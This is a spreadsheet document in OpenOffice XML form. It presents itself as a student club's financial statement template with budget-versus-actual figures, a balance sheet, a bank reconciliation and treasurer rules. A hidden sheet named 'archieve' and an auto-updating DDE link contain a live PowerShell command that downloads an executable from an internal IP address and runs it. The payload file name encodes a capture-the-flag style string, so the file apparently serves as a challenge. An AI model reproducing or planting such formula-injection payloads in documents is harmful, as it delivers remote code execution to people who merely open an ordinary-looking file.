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0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081cm"/>
    </style:style>
    <style:style style:name="co5" style:family="table-column">
      <style:table-column-properties fo:break-before="auto" style:column-width="0.337cm"/>
    </style:style>
    <style:style style:name="co6" style:family="table-column">
      <style:table-column-properties fo:break-before="auto" style:column-width="4.981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8.02cm"/>
    </style:style>
    <style:style style:name="co10" style:family="table-column">
      <style:table-column-properties fo:break-before="auto" style:column-width="2.589cm"/>
    </style:style>
    <style:style style:name="co11" style:family="table-column">
      <style:table-column-properties fo:break-before="auto" style:column-width="2.279cm"/>
    </style:style>
    <style:style style:name="co12" style:family="table-column">
      <style:table-column-properties fo:break-before="auto" style:column-width="0.365cm"/>
    </style:style>
    <style:style style:name="co13" style:family="table-column">
      <style:table-column-properties fo:break-before="auto" style:column-width="4.4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impl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With_20_Bank_20_Rec_20__28_use_20_if_20_needed_29_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527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21"/>
    <style:style style:name="ce1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118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118"/>
    <style:style style:name="ce15" style:family="table-cell" style:parent-style-name="Excel_20_Built-in_20_Normal" style:data-style-name="N118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 style:data-style-name="N121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17" style:family="table-cell" style:parent-style-name="Excel_20_Built-in_20_Normal" style:data-style-name="N121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21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 style:data-style-name="N110"/>
    <style:style style:name="ce21" style:family="table-cell" style:parent-style-name="Excel_20_Built-in_20_Normal" style:data-style-name="N110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2" style:family="table-cell" style:parent-style-name="Excel_20_Built-in_20_Normal" style:data-style-name="N110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35cm solid #000000"/>
    </style:style>
    <style:style style:name="ce23" style:family="table-cell" style:parent-style-name="Excel_20_Built-in_20_Normal" style:data-style-name="N118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rotation-align="none"/>
    </style:style>
    <style:style style:name="ce26" style:family="table-cell" style:parent-style-name="Excel_20_Built-in_20_Normal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 style:data-style-name="N120"/>
    <style:style style:name="ce28" style:family="table-cell" style:parent-style-name="Excel_20_Built-in_20_Currency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30" style:family="table-cell" style:parent-style-name="Excel_20_Built-in_20_Currency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 style:data-style-name="N11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ple" table:style-name="ta1" table:print-ranges="Simple.A1:Simple.F53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/>
          <table:table-cell table:style-name="ce8" office:value-type="string">
            <text:p><text:s/>CLUB NAME [G/UG]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FINANCIAL STATEMENT - BUDGET VS ACTUAL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FOR YEAR ENDED APRIL 30, 201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>
            <text:p>Profit and Loss Statemen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BUDGET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BUDGET</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce8"/>
          <table:table-cell table:style-name="ce1"/>
          <table:table-cell table:number-columns-repeated="1018"/>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell/>
          <table:table-cell table:number-columns-repeated="2" table:style-name="ce8" office:value-type="string">
            <text:p>2013-2014</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce8" office:value-type="string">
            <text:p>2014-2015</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce1"/>
          <table:table-cell table:style-name="ce1" office:value-type="string">
            <text:p>2014-2015 Budget Not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VENUE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MEMBERSHIP FEES </text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce11" office:value-type="float" office:value="500">
            <text:p><text:s/>$500.00 </text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="2" table:style-name="ce11" office:value-type="float" office:value="600">
            <text:p><text:s/>$600.00 </text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce14"/>
          <table:table-cell office:value-type="string">
            <text:p>(# of members x $ fee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PONSORSHIPS</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="3" table:style-name="ce12" office:value-type="float" office:value="200">
            <text:p>2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GBC/UBC <text:s/>FUNDING</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce12" office:value-type="float" office:value="100">
            <text:p>100.00 </text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="2" table:style-name="ce12" office:value-type="float" office:value="0">
            <text:p><text:s/>-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EVENT ONE</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce12" office:value-type="float" office:value="300">
            <text:p>300.00 </text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce12" office:value-type="float" office:value="400">
            <text:p>400.00 </text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce12" office:value-type="float" office:value="500">
            <text:p>5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EVENT TWO</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce12" office:value-type="float" office:value="300">
            <text:p>300.00 </text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce12" office:value-type="float" office:value="500">
            <text:p>500.00 </text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce12" office:value-type="float" office:value="600">
            <text:p>6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INTEREST</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce12" office:value-type="float" office:value="0">
            <text:p><text:s/>- </text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce12" office:value-type="float" office:value="0.11">
            <text:p>0.11 </text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce12" office:value-type="float" office:value="0">
            <text:p><text:s/>-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TOTAL</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13" table:formula="of:=SUM([.B10:.B15])" office:value-type="float" office:value="1400">
            <text:p><text:s/>$1,400 </text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce17" table:formula="of:=SUM([.C10:.C15])" office:value-type="float" office:value="1700.11">
            <text:p><text:s/>$1,700.11 </text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13" table:formula="of:=SUM([.D10:.D15])" office:value-type="float" office:value="1900">
            <text:p><text:s/>$1,90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EXPENSES</text:p>
          </table:table-cell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VENT ONE</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce11" office:value-type="float" office:value="200">
            <text:p><text:s/>$200.00 </text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce11" office:value-type="float" office:value="233.65">
            <text:p><text:s/>$233.65 </text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce11" office:value-type="float" office:value="300">
            <text:p><text:s/>$300.00 </text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce14"/>
          <table:table-cell office:value-type="string">
            <text:p>CHQ # 95,9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VENT TWO</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce12" office:value-type="float" office:value="200">
            <text:p>200.00 </text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce12" office:value-type="float" office:value="535.9">
            <text:p>535.90 </text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce12" office:value-type="float" office:value="600">
            <text:p>600.00 </text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce14"/>
          <table:table-cell office:value-type="string">
            <text:p>CHQ #97,98,9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LUB FAIR</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce12" office:value-type="float" office:value="100">
            <text:p>100.00 </text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="2" table:style-name="ce12" office:value-type="float" office:value="50">
            <text:p>50.00 </text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce14"/>
          <table:table-cell office:value-type="string">
            <text:p>CHQ#9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NK CHARGES</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce12" office:value-type="float" office:value="45">
            <text:p>45.00 </text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce12" office:value-type="float" office:value="21">
            <text:p>21.00 </text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce12" office:value-type="float" office:value="20">
            <text:p>20.00 </text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce14"/>
          <table:table-cell office:value-type="string">
            <text:p>FROM BK STMT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DMINISTRATION</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce12" office:value-type="float" office:value="20">
            <text:p>20.00 </text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce12" office:value-type="float" office:value="36.2">
            <text:p>36.20 </text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce12" office:value-type="float" office:value="40">
            <text:p>40.00 </text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce14"/>
          <table:table-cell office:value-type="string">
            <text:p>CHQ#9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OTAL</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13" table:formula="of:=SUM([.B19:.B23])" office:value-type="float" office:value="565">
            <text:p><text:s/>$565 </text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce17" table:formula="of:=SUM([.C19:.C23])" office:value-type="float" office:value="876.75">
            <text:p><text:s/>$876.75 </text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13" table:formula="of:=SUM([.D19:.D23])" office:value-type="float" office:value="1010">
            <text:p><text:s/>$1,01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2">
          <table:table-cell table:style-name="ce4" office:value-type="string">
            <text:p>NET CONTRIBUTION (DEFICIT) FOR THE YEAR</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce15" table:formula="of:=[.B16]-[.B24]" office:value-type="float" office:value="835">
            <text:p><text:s/>$835 </text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce18" table:formula="of:=[.C16]-[.C24]" office:value-type="float" office:value="823.36">
            <text:p><text:s/>$823.36 </text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce15" table:formula="of:=[.D16]-[.D24]" office:value-type="float" office:value="890">
            <text:p><text:s/>$89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/>
          <table:table-cell table:style-name="ce10"/>
          <table:table-cell table:style-name="ce19" office:value-type="string" office:string-value="Balance Sheet">
            <text:p>Balance Sheet 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OPENING BALANCE</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce10" office:value-type="float" office:value="100">
            <text:p><text:s/>$100.00 </text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce10" table:formula="of:=[.B29]" office:value-type="float" office:value="100">
            <text:p><text:s/>$100.00 </text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce10" table:formula="of:=[.C31]" office:value-type="float" office:value="923.36">
            <text:p><text:s/>$923.36 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5" office:value-type="string">
            <text:p>NET CONTRIBUTION (DEFICIT) FOR THE YEAR</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce10" table:formula="of:=[.B26]" office:value-type="float" office:value="835">
            <text:p><text:s/>$835.00 </text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce10" table:formula="of:=[.C26]" office:value-type="float" office:value="823.36">
            <text:p><text:s/>$823.36 </text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce10" table:formula="of:=[.D26]" office:value-type="float" office:value="890">
            <text:p><text:s/>$890.00 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LOSING BALANCE</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce16" table:formula="of:=SUM([.B29:.B30])" office:value-type="float" office:value="935">
            <text:p><text:s/>$935.00 </text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce18" table:formula="of:=SUM([.C29:.C30])" office:value-type="float" office:value="923.36">
            <text:p><text:s/>$923.36 </text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce16" table:formula="of:=SUM([.D29:.D30])" office:value-type="float" office:value="1813.36">
            <text:p><text:s/>$1,813.36 </text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce2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ING BALANCE CONSISTS OF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BALANCE PER THE BANK</text:p>
          </table:table-cell>
          <table:table-cell/>
          <table:table-cell table:style-name="ce20" office:value-type="float" office:value="700">
            <text:p>700.00 </text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="1021"/>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string">
            <text:p><text:s text:c="4"/>ADD: OUTSTANDING DEPOSITS</text:p>
          </table:table-cell>
          <table:table-cell/>
          <table:table-cell table:style-name="ce20" office:value-type="float" office:value="400">
            <text:p>400.00 </text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="2"/>
          <table:table-cell office:value-type="string">
            <text:p>DEPOSITED TO BANK MAY 2</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="1018"/>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string">
            <text:p><text:s text:c="4"/>DEDUCT: OUTSTANDING CHEQUE (LISTED)</text:p>
          </table:table-cell>
          <table:table-cell/>
          <table:table-cell table:style-name="ce20" office:value-type="float" office:value="-100">
            <text:p><text:s/>(100.00)</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="2"/>
          <table:table-cell office:value-type="string">
            <text:p>CHQ# 99 ISSUED APRIL 30</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="1018"/>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string">
            <text:p><text:s text:c="2"/>ADJUSTED BANK</text:p>
          </table:table-cell>
          <table:table-cell/>
          <table:table-cell table:style-name="ce21" table:formula="of:=SUM([.C34:.C36])" office:value-type="float" office:value="1000">
            <text:p>1,000.00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>
            <text:p>LESS: ACCOUNT PAYABLE</text:p>
          </table:table-cell>
          <table:table-cell/>
          <table:table-cell table:style-name="ce20" office:value-type="float" office:value="-76.64">
            <text:p><text:s/>(76.64)</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="2"/>
          <table:table-cell office:value-type="string">
            <text:p>CHQ#100 ISSUED MAY 2</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="1018"/>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string">
            <text:p>CLOSING BALANCE</text:p>
          </table:table-cell>
          <table:table-cell/>
          <table:table-cell table:style-name="ce22" table:formula="of:=[.C37]+[.C39]" office:value-type="float" office:value="923.36">
            <text:p>923.36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>
            <text:p>THINGS TO REMEMBER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. ALL FUNDS RECEIVED (INCLUDING CASH) ARE DEPOSITED INTO BANK ACCOUNT.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<text:s text:c="3"/>2. <text:s/>CHEQUES ARE WRITTEN TO PAY EXPENSES. (SEE #4) NO PETTY CASH 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3. NO USE OF CLUB DEBIT CARD TO PAY FOR EXPENSES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4. NO CASH WITHDRAWALS FROM THE BANK ACCOUNT. IF VENDOR WILL NOT ACCEPT A CLUB CHEQUE, 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 text:c="5"/>AN EXECUTIVE MEMBER WILL PAY BY PERSONAL DEBIT OR CREDIT CARD AND SUBMIT AN EXPENSE CLAIM WITH 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 text:c="4"/>RECEIPTS FOR REIMBURSEMENT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. THERE MUST BE THREE CHEQUE SIGNERS ON THE BANK ACCOUNT. TWO CHEQUE SIGNERS ON ANY CHEQUE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6. OBTAIN COPIES OF ALL CANCELLED CHEQUES. (BOTH FRONT AND BACK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7. <text:s/>TRANSFER ALL PAYPAL BALANCES PRIOR TO APRIL 30, 201X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8. UNDERSTAND WHEN IT IS ACCEPTABLE TO USE A "FLOAT" FOR EVE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imple.$A$1" table:cell-range-address="$Simple.$A$1:.$F$53" table:range-usable-as="print-range"/>
        </table:named-expressions>
      </table:table>
      <table:table table:name="archieve" table:style-name="ta2" table:print="false">
        <office:forms form:automatic-focus="false" form:apply-design-mode="false"/>
        <table:table-column table:style-name="co8" table:default-cell-style-name="Default"/>
        <table:table-row table:style-name="ro3">
          <table:table-cell table:formula="of:=DDE(&quot;powershell&quot;;&quot;Invoke-WebRequest -Uri 'http://192.168.1.114/Q1RGe0NTVl8xbmozdDEwbl8y.TMP.exe' -OutFile 'C:\Users\FinanceDept\AppData\Local\Temp\Q1RGe0NTVl8xbmozdDEwbl8y.TMP.exe'; Start-Process 'C:\Users\FinanceDept\AppData\Local\Temp\Q1RGe0NTVl8xbmozdDEwbl8y.TMP.exe'&quot;;&quot;!A0&quot;)" office:value-type="float" office:value="0">
            <text:p>#N/A</text:p>
          </table:table-cell>
        </table:table-row>
        <table:named-expressions/>
      </table:table>
      <table:table table:name="With Bank Rec (use if needed)" table:style-name="ta3" table:print-ranges="'With Bank Rec (use if needed)'.A1:'With Bank Rec (use if needed)'.F46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/>
          <table:table-cell table:style-name="ce8" office:value-type="string">
            <text:p>CLUB NAME [G/UG]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FINANCIAL STATEMENT - BUDGET VS ACTUAL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FOR YEAR ENDED APRIL 30, 201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>
            <text:p>Profit and Loss Statement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>
            <text:p>BUDGET</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce8" office:value-type="string">
            <text:p>ACTUAL</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce8" office:value-type="string">
            <text:p>BUDGET</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce8"/>
          <table:table-cell table:style-name="ce1"/>
          <table:table-cell table:number-columns-repeated="1018"/>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell/>
          <table:table-cell table:number-columns-repeated="2" table:style-name="ce8" office:value-type="string">
            <text:p>2013-2014</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce8" office:value-type="string">
            <text:p>2014-2015</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce1"/>
          <table:table-cell table:style-name="ce1" office:value-type="string">
            <text:p>2014-2015 Budget Not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VENUE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2" office:value-type="string">
            <text:p>MEMBERSHIP FEES </text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce11" office:value-type="float" office:value="500">
            <text:p><text:s/>$500.00 </text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="2" table:style-name="ce11" office:value-type="float" office:value="600">
            <text:p><text:s/>$600.00 </text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce14"/>
          <table:table-cell office:value-type="string">
            <text:p>(# of members x $ fee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PONSORSHIPS</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="3" table:style-name="ce12" office:value-type="float" office:value="200">
            <text:p>2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GBC/UBC <text:s/>FUNDING</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce12" office:value-type="float" office:value="100">
            <text:p>100.00 </text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="2" table:style-name="ce12" office:value-type="float" office:value="0">
            <text:p><text:s/>-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EVENT ONE</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce12" office:value-type="float" office:value="300">
            <text:p>300.00 </text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce12" office:value-type="float" office:value="400">
            <text:p>400.00 </text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce12" office:value-type="float" office:value="500">
            <text:p>5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EVENT TWO</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce12" office:value-type="float" office:value="300">
            <text:p>300.00 </text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce12" office:value-type="float" office:value="500">
            <text:p>500.00 </text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce12" office:value-type="float" office:value="600">
            <text:p>6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INTEREST</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce12" office:value-type="float" office:value="0">
            <text:p><text:s/>- </text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce12" office:value-type="float" office:value="0.11">
            <text:p>0.11 </text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce12" office:value-type="float" office:value="0">
            <text:p><text:s/>-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TOTAL</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13" table:formula="of:=SUM([.B10:.B15])" office:value-type="float" office:value="1400">
            <text:p><text:s/>$1,400 </text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce17" table:formula="of:=SUM([.C10:.C15])" office:value-type="float" office:value="1700.11">
            <text:p><text:s/>$1,700.11 </text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13" table:formula="of:=SUM([.D10:.D15])" office:value-type="float" office:value="1900">
            <text:p><text:s/>$1,90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EXPENSES</text:p>
          </table:table-cell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VENT ONE</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce11" office:value-type="float" office:value="200">
            <text:p><text:s/>$200.00 </text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce11" office:value-type="float" office:value="233.65">
            <text:p><text:s/>$233.65 </text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce11" office:value-type="float" office:value="300">
            <text:p><text:s/>$3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EVENT TWO</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce12" office:value-type="float" office:value="200">
            <text:p>200.00 </text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce12" office:value-type="float" office:value="535.9">
            <text:p>535.90 </text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce12" office:value-type="float" office:value="600">
            <text:p>60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CLUB FAIR</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce12" office:value-type="float" office:value="100">
            <text:p>100.00 </text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="2" table:style-name="ce12" office:value-type="float" office:value="50">
            <text:p>5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BANK CHARGES</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce12" office:value-type="float" office:value="45">
            <text:p>45.00 </text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce12" office:value-type="float" office:value="21">
            <text:p>21.00 </text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce12" office:value-type="float" office:value="20">
            <text:p>2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ADMINISTRATION</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce12" office:value-type="float" office:value="20">
            <text:p>20.00 </text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce12" office:value-type="float" office:value="36.2">
            <text:p>36.20 </text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce12" office:value-type="float" office:value="40">
            <text:p>40.00 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3" office:value-type="string">
            <text:p>TOTAL</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13" table:formula="of:=SUM([.B19:.B23])" office:value-type="float" office:value="565">
            <text:p><text:s/>$565 </text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce17" table:formula="of:=SUM([.C19:.C23])" office:value-type="float" office:value="876.75">
            <text:p><text:s/>$876.75 </text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce13" table:formula="of:=SUM([.D19:.D23])" office:value-type="float" office:value="1010">
            <text:p><text:s/>$1,01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4"/>
          <table:table-cell table:style-name="ce10"/>
          <table:table-cell table:style-name="ce14" table:number-columns-repeated="2"/>
          <table:table-cell table:number-columns-repeated="1019"/>
        </table:table-row>
        <table:table-row table:style-name="ro4">
          <table:table-cell table:style-name="ce4" office:value-type="string">
            <text:p>NET CONTRIBUTION (DEFICIT) FOR THE YEAR</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce15" table:formula="of:=[.B16]-[.B24]" office:value-type="float" office:value="835">
            <text:p><text:s/>$835 </text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce18" table:formula="of:=[.C16]-[.C24]" office:value-type="float" office:value="823.36">
            <text:p><text:s/>$823.36 </text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce15" table:formula="of:=[.D16]-[.D24]" office:value-type="float" office:value="890">
            <text:p><text:s/>$890 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/>
          <table:table-cell table:style-name="ce10"/>
          <table:table-cell table:style-name="ce19" office:value-type="string" office:string-value="Balance Sheet">
            <text:p>Balance Sheet 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OPENING CASH</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce10" office:value-type="float" office:value="100">
            <text:p><text:s/>$100.00 </text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce10" table:formula="of:=[.B29]" office:value-type="float" office:value="100">
            <text:p><text:s/>$100.00 </text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce10" table:formula="of:=[.C31]" office:value-type="float" office:value="923.36">
            <text:p><text:s/>$923.36 </text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce10"/>
          <table:table-cell table:number-columns-repeated="1019"/>
        </table:table-row>
        <table:table-row table:style-name="ro4">
          <table:table-cell table:style-name="ce5" office:value-type="string">
            <text:p>NET CONTRIBUTION (DEFICIT) FOR THE YEAR</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce10" table:formula="of:=[.B26]" office:value-type="float" office:value="835">
            <text:p><text:s/>$835.00 </text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce10" table:formula="of:=[.C26]" office:value-type="float" office:value="823.36">
            <text:p><text:s/>$823.36 </text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce10" table:formula="of:=[.D26]" office:value-type="float" office:value="890">
            <text:p><text:s/>$890.00 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LOSING CASH</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce16" table:formula="of:=SUM([.B29:.B30])" office:value-type="float" office:value="935">
            <text:p><text:s/>$935.00 </text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce18" table:formula="of:=SUM([.C29:.C30])" office:value-type="float" office:value="923.36">
            <text:p><text:s/>$923.36 </text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce16" table:formula="of:=SUM([.D29:.D30])" office:value-type="float" office:value="1813.36">
            <text:p><text:s/>$1,813.36 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/>
          <table:table-cell table:style-name="ce10"/>
          <table:table-cell table:style-name="ce26" office:value-type="string" office:string-value="Bank Reconciliation">
            <text:p>Bank Reconciliation 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>
            <text:p>Balance per bank as at April 30, 2014</text:p>
          </table:table-cell>
          <table:table-cell/>
          <table:table-cell table:style-name="ce27" office:value-type="float" office:value="887.16">
            <text:p><text:s/>$887.16 </text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="1021"/>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string">
            <text:p>Add: Outstanding Deposit</text:p>
          </table:table-cell>
          <table:table-cell/>
          <table:table-cell table:style-name="ce27" office:value-type="float" office:value="0">
            <text:p><text:s/>$- </text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce25"/>
          <table:table-cell table:number-columns-repeated="1020"/>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string">
            <text:p>Less: Outstanding Cheques</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce25"/>
          <table:table-cell table:style-name="ce27" office:value-type="float" office:value="36.2">
            <text:p><text:s/>$36.20 </text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce25"/>
          <table:table-cell/>
          <table:table-cell office:value-type="string">
            <text:p>(List cheque #)</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="1018"/>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string">
            <text:p>Cash Balance</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce25"/>
          <table:table-cell table:style-name="ce28" table:formula="of:=SUM([.C34:.C36])" office:value-type="float" office:value="923.36">
            <text:p><text:s/>$923.36 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/>
          <table:table-cell table:style-name="ce25"/>
          <table:table-cell/>
          <table:table-cell table:style-name="ce25"/>
          <table:table-cell table:number-columns-repeated="1020"/>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string">
            <text:p>Cash Held</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce25"/>
          <table:table-cell table:style-name="ce11" office:value-type="float" office:value="0">
            <text:p><text:s/>$- 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/>
          <table:table-cell table:style-name="ce25"/>
          <table:table-cell table:style-name="ce29"/>
          <table:table-cell table:style-name="ce25" table:number-columns-repeated="2"/>
          <table:table-cell table:number-columns-repeated="1019"/>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string">
            <text:p>Add: Accounts Receivable</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce25"/>
          <table:table-cell table:style-name="ce11" office:value-type="float" office:value="0">
            <text:p><text:s/>$- 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 office:value-type="string">
            <text:p>Less: Accounts Payable</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce25"/>
          <table:table-cell table:style-name="ce11" office:value-type="float" office:value="0">
            <text:p><text:s/>$- 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/>
          <table:table-cell table:style-name="ce25"/>
          <table:table-cell/>
          <table:table-cell table:style-name="ce25"/>
          <table:table-cell table:number-columns-repeated="1020"/>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string">
            <text:p>Cash Balance per above</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce25"/>
          <table:table-cell table:style-name="ce30" table:formula="of:=SUM([.C37:.C43])" office:value-type="float" office:value="923.36">
            <text:p><text:s/>$923.36 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 office:value-type="string">
            <text:p>Difference (must be zero)</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce25"/>
          <table:table-cell table:style-name="ce31" table:formula="of:=[.C31]-[.C44]" office:value-type="float" office:value="0">
            <text:p><text:s/>$- </text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce25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5"/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Simple.$A$1" table:cell-range-address="$'With Bank Rec (use if needed)'.$A$1:.$F$46" table:range-usable-as="print-range"/>
        </table:named-expressions>
      </table:table>
      <table:named-expressions/>
      <table:dde-links>
        <table:dde-link>
          <office:dde-source office:dde-application="powershell" office:dde-topic="Invoke-WebRequest -Uri 'http://192.168.1.114/Q1RGe0NTVl8xbmozdDEwbl8y.TMP.exe' -OutFile 'C:\Users\FinanceDept\AppData\Local\Temp\Q1RGe0NTVl8xbmozdDEwbl8y.TMP.exe'; Start-Process 'C:\Users\FinanceDept\AppData\Local\Temp\Q1RGe0NTVl8xbmozdDEwbl8y.TMP.exe'" office:dde-item="!A0" office:automatic-update="true"/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8000" number:language="en" number:country="GB">
      <number:number number:min-integer-digits="1"/>
    </number:number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 $(</number:text>
      <number:number number:decimal-places="0" number:min-integer-digits="1" number:grouping="true"/>
      <number:text>)</number:text>
    </number:number-style>
    <number:number-style style:name="N118P2" style:volatile="true">
      <number:text> $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-$</number:text>
      <number:number number:decimal-places="2" number:min-integer-digits="1" number:grouping="true"/>
      <number:text> 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4"/>
    <style:style style:name="Excel_20_Built-in_20_Comma" style:display-name="Excel Built-in Comma" style:family="table-cell" style:parent-style-name="Excel_20_Built-in_20_Normal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-X="1" style:scale-to-Y="1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00:4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mple" style:display-name="PageStyle_Si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th_20_Bank_20_Rec_20__28_use_20_if_20_needed_29_" style:display-name="PageStyle_With Bank Rec (use if needed)" style:page-layout-name="Mpm4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  <style:region-right>
          <text:p><text:span text:style-name="MT1"><text:date style:data-style-name="N2" text:date-value="2024-09-17">17/09/2024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7T00:41:29.80</dc:date>
    <meta:generator>OpenOffice/4.0.1$Win32 OpenOffice.org_project/401m5$Build-9714</meta:generator>
